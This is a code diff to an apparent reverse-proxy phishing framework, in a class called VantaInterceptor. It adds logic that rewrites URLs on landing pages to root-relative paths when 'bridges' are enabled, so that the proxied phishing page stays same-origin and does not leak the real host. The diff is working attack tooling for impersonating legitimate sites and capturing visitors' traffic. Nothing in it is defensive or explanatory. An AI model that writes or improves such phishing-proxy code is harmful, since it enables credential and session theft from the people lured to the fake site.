@@ -617,6 +617,14 @@ class VantaInterceptor:
                 
                 search_str = f.search.replace("{hostname}", target_hostname).replace("{domain}", f.domain)
                 replace_str = f.replace.replace("{hostname}", phish_hostname).replace("{domain}", base_domain)
+                # If landing host and bridges are enabled, prefer root-relative path to keep same-origin
+                try:
+                    has_bridges = len(getattr(self.phishlet, "bridges", [])) > 0
+                    is_landing = any((ph.orig_sub == f.orig_sub and ph.domain == f.domain and getattr(ph, "is_landing", False)) for ph in getattr(self.phishlet, "proxy_hosts", []))
+                    if has_bridges and is_landing:
+                        replace_str = "/"
+                except Exception:
+                    pass
                 # If bridged, prefer path-only replacement to avoid absolute host leakage (e.g., 127.0.0.1)
                 if bridge_prefix:
                     replace_str = bridge_prefix
